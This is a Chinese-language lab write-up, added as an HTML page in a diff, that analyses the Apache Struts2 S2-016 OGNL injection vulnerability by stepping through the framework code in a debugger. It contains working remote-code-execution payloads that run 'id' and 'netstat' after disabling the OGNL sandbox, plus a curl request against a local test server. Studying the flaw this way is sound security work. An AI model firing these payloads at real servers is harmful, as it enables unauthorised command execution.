@@ -1,0 +1,124 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h1 data-content="1" id="5babd4fb1dc70d7ce1baf39a27f5f516">S2-016</h1>
+<p>影响版本</p>
+<blockquote>
+<p>Struts2.0.0 - Struts2.3.15</p>
+</blockquote>
+<p>漏洞成因</p>
+<blockquote>
+<p>DefaultActionMapper类支持以"action:"、"redirect:"、"redirectAction:"作为导航或是重定向前缀，但是这些前缀后面同时可以跟OGNL表达式，由于struts2没有对这些前缀做过滤，导致利用OGNL表达式调用java静态方法执行任意系统命令</p>
+</blockquote>
+<p>复现环境是 vulhub 和vulapp</p>
+<h2 data-content="1" id="fc880a95d1f24ce2b9f2dfd9d7a4f6d3">Payload</h2>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190329153528-3979ddf6-51f5-1.png"/></p>
+<pre><code>redirect:%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23f.setAccessible%28true%29%2C%23f.set%28%23_memberAccess%2Ctrue%29%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%29%7D</code></pre>
+<pre><code>?redirect:
+${#a=new java.lang.ProcessBuilder(new java.lang.String[]{"netstat","-an"}).start().getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[51020],#c.read(#d),#screen=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter(),#screen.println(#d),#screen.close()}</code></pre>
+<h2 data-content="1" id="348628255eddf00df2c4b6151babea11">调试</h2>
+<blockquote>
+<p>第一次调试,弄环境弄了半天,记录一下<br/>
+把war包 扔到webapps下 自动部署了 (也可以用TdeCompile) 出现一个文件夹(a)<br/>
+idea 新建project java web (文件夹b)<br/>
+把a下面的web-inf 扔到 b的web-inf  a的class下的文件要JD-GUI反编译一下 扔到b的src里<br/>
+idea 里面再重新载入一下 lib下的文件<br/>
+添加tomcat服务器<br/>
+就可以了</p>
+</blockquote>
+<p>DefaultActionMapper在处理短路径重定向参数前缀<br/>
+　　"action:"/"redirect:"/"redirectAction:"时存在命令执行漏洞，由于对<br/>
+　　"action:"/"redirect:"/"redirectAction:"后的URL信息使用OGNL表达式处理，远程攻击者可以利用漏洞提交特殊URL可用于执行任意Java代码。<br/>
+重定向请求 会让DefaultActionMapper 来处理<br/>
+这是重定向请求的参数前缀<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20190329153528-39975606-51f5-1.png"/><br/>
+断点 下在这里<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20190329153529-3a0341e0-51f5-1.png"/></p>
+<div class="highlight"><pre><span></span><span class="k">this</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"redirect:"</span><span class="o">,</span> <span class="k">new</span> <span class="n">ParameterAction</span><span class="o">()</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">execute</span><span class="o">(</span><span class="n">String</span> <span class="n">key</span><span class="o">,</span> <span class="n">ActionMapping</span> <span class="n">mapping</span><span class="o">)</span> <span class="o">{</span>
+        <span class="n">ServletRedirectResult</span> <span class="n">redirect</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ServletRedirectResult</span><span class="o">();</span><span class="c1">//重定向url 设置一些参数 如statuscode=302</span>
+        <span class="n">DefaultActionMapper</span><span class="o">.</span><span class="na">this</span><span class="o">.</span><span class="na">container</span><span class="o">.</span><span class="na">inject</span><span class="o">(</span><span class="n">redirect</span><span class="o">);</span>
+        <span class="n">redirect</span><span class="o">.</span><span class="na">setLocation</span><span class="o">(</span><span class="n">key</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="s">"redirect:"</span><span class="o">.</span><span class="na">length</span><span class="o">()));</span><span class="c1">//去掉前面的redirect://</span>
+        <span class="n">mapping</span><span class="o">.</span><span class="na">setResult</span><span class="o">(</span><span class="n">redirect</span><span class="o">);</span><span class="c1">//把redirect 加进去了 只有location改变了</span>
+    <span class="o">}</span>
+<span class="o">});</span>
+</pre></div>
+<p>struts2会调用setLocation方法将他设置到redirect.location中。然后这里调用mapping.setResult(redirect)将redirect对象设置到mapping对象中的result里<br/>
+接下来到</p>
+<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kt">void</span> <span class="nf">handleSpecialParameters</span><span class="o">(</span><span class="n">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="n">ActionMapping</span> <span class="n">mapping</span><span class="o">)</span> <span class="o">{</span>
+    <span class="n">Set</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;</span> <span class="n">uniqueParameters</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashSet</span><span class="o">();</span>
+    <span class="n">Map</span> <span class="n">parameterMap</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameterMap</span><span class="o">();</span><span class="c1">//parameterMap 里面就是我们的payload</span>
+    <span class="n">Iterator</span> <span class="n">i$</span> <span class="o">=</span> <span class="n">parameterMap</span><span class="o">.</span><span class="na">keySet</span><span class="o">().</span><span class="na">iterator</span><span class="o">();</span>
+    <span class="k">while</span><span class="o">(</span><span class="n">i$</span><span class="o">.</span><span class="na">hasNext</span><span class="o">())</span> <span class="o">{</span>
+        <span class="n">Object</span> <span class="n">o</span> <span class="o">=</span> <span class="n">i$</span><span class="o">.</span><span class="na">next</span><span class="o">();</span>
+        <span class="n">String</span> <span class="n">key</span> <span class="o">=</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span><span class="n">o</span><span class="o">;</span><span class="c1">//payload转换成字符串</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">key</span><span class="o">.</span><span class="na">endsWith</span><span class="o">(</span><span class="s">".x"</span><span class="o">)</span> <span class="o">||</span> <span class="n">key</span><span class="o">.</span><span class="na">endsWith</span><span class="o">(</span><span class="s">".y"</span><span class="o">))</span> <span class="o">{</span>
+            <span class="n">key</span> <span class="o">=</span> <span class="n">key</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="mi">0</span><span class="o">,</span> <span class="n">key</span><span class="o">.</span><span class="na">length</span><span class="o">()</span> <span class="o">-</span> <span class="mi">2</span><span class="o">);</span><span class="c1">//如果有.x .y 结尾就截掉了</span>
+        <span class="o">}</span>
+        <span class="k">if</span> <span class="o">(!</span><span class="n">uniqueParameters</span><span class="o">.</span><span class="na">contains</span><span class="o">(</span><span class="n">key</span><span class="o">))</span> <span class="o">{</span>
+            <span class="n">ParameterAction</span> <span class="n">parameterAction</span> <span class="o">=</span> <span class="o">(</span><span class="n">ParameterAction</span><span class="o">)</span><span class="k">this</span><span class="o">.</span><span class="na">prefixTrie</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">key</span><span class="o">);</span>
+            <span class="k">if</span> <span class="o">(</span><span class="n">parameterAction</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+                <span class="n">parameterAction</span><span class="o">.</span><span class="na">execute</span><span class="o">(</span><span class="n">key</span><span class="o">,</span> <span class="n">mapping</span><span class="o">);</span>
+                <span class="n">uniqueParameters</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">key</span><span class="o">);</span><span class="c1">//把payload加到了set里</span>
+                <span class="k">break</span><span class="o">;</span>
+            <span class="o">}</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</pre></div>
+<p>觉得这里的parameterAction.execute 执行的就是我们第一个断点的位置,而getMapping调用了这个上面的函数handleSpecialParameters.<br/>
+我觉得我们这个断点下的 在调用的最深层,之后还要出去 往回 走 类似调用栈的那种感觉..所以才会造成明明是getMapping 调用了handleSpecialParameters,而在idea里 handleSpecialParameters是getMapping<br/>
+正确的调用顺序 getMapping-&gt;handleSpecialParameters-&gt;DefaultActionMapper里的prefixTrie中的一个<br/>
+这就已经把payload 送进了mapping 的result 的location里<br/>
+发现有execute 继续跟<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20190329153530-3a6a38d2-51f5-1.png"/><br/>
+cleanupRequest 也是一个过滤 但没啥用<br/>
+继续跟 才是最关键的<br/>
+org.apache.struts2.dispatcher.Dispatcher#serviceAction</p>
+<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kt">void</span> <span class="nf">serviceAction</span><span class="o">(</span><span class="n">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="n">HttpServletResponse</span> <span class="n">response</span><span class="o">,</span> <span class="n">ServletContext</span> <span class="n">context</span><span class="o">,</span> <span class="n">ActionMapping</span> <span class="n">mapping</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">ServletException</span> <span class="o">{</span>
+</pre></div>
+<p>//看这些参数的时候就知道 要执行OGNL了,mapping context 啥的<br/>
+//下面还有什么valuestack的操作<br/>
+//最关键的</p>
+<div class="highlight"><pre><span></span><span class="k">if</span> <span class="o">(</span><span class="n">mapping</span><span class="o">.</span><span class="na">getResult</span><span class="o">()</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+    <span class="n">Result</span> <span class="n">result</span> <span class="o">=</span> <span class="n">mapping</span><span class="o">.</span><span class="na">getResult</span><span class="o">();</span><span class="c1">//我们的payload 就在result location 里</span>
+    <span class="n">result</span><span class="o">.</span><span class="na">execute</span><span class="o">(</span><span class="n">proxy</span><span class="o">.</span><span class="na">getInvocation</span><span class="o">());</span>
+<span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+    <span class="n">proxy</span><span class="o">.</span><span class="na">execute</span><span class="o">();</span>
+<span class="o">}</span>
+</pre></div>
+<p>这个地方就是啥呢,看我们的action 映射是不是直接访问网页,如果是直接访问网页就走else 里面的execute.<br/>
+而我们现在是redirect 302 跳转 就走上面的<br/>
+我们走的是上面的<br/>
+继续<br/>
+现在就已经是执行payload的部分了</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190329153530-3a98f0fa-51f5-1.png"/><br/>
+TextParseUtil.translateVariables 就是提取出OGNL表达式并执行<br/>
+一步一步跟  有很多com.opensymphony.xwork2.util.OgnlTextParser 解析OGNL的<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20190329153530-3af3c52a-51f5-1.png"/><br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20190329153531-3b30dc9e-51f5-1.png"/><br/>
+需要把他改成true 绕过沙盒<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20190329153532-3b9b21bc-51f5-1.png"/><br/>
+细致的跟踪<br/>
+后面经常出现<br/>
+getvalue<br/>
+this.evaluateGetValueBody<br/>
+ognl.SimpleNode#evaluateGetValueBody<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20190329153532-3bcd2518-51f5-1.png"/><br/>
+这地方可能是 tree 分开之后的 每个payload小语句 执行 循环<br/>
+补充一下<br/>
+org.apache.struts2.dispatcher.ng.ExecuteOperations#executeAction<br/>
+启动的时候有一些参数<br/>
+没修改之前的context<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20190329153532-3c0f3d9a-51f5-1.png"/></p>
+<p>Getvalue-&gt;evaluateGetValueBody-&gt;Getvaluebody<br/>
+ognl.OgnlRuntime#callMethod(ognl.OgnlContext, java.lang.Object, java.lang.String, java.lang.Object[])<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20190401123604-a8c3e776-5437-1.png"/></p>
+<p>这里就执行了OGNL表达式</p>
+<p>curl -v  <a href="http://localhost:8081/S2_016_war_exploded/default.action\?redirect:%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23f.setAccessible%28true%29%2C%23f.set%28%23_memberAccess%2Ctrue%29%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%29%7D" target="_blank">http://localhost:8081/S2_016_war_exploded/default.action\?redirect:%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23f.setAccessible%28true%29%2C%23f.set%28%23_memberAccess%2Ctrue%29%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%29%7D</a></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190329153533-3ca2a3c8-51f5-1.png"/></p>
+<h2 data-content="1" id="30e517e62280e38dd4201337b676102a">参考文章:</h2>
+<p><a href="https://blog.csdn.net/u011721501/article/details/41735885" target="_blank">很详细的调试S2-016</a></p>
+<p><a href="https://xz.aliyun.com/t/111" target="_blank">030509调试内有调用链参考下</a></p>
+<p>可能有的地方说的不对,希望师傅们指正(萌新瑟瑟发抖)</p>
+</div>
+</div>
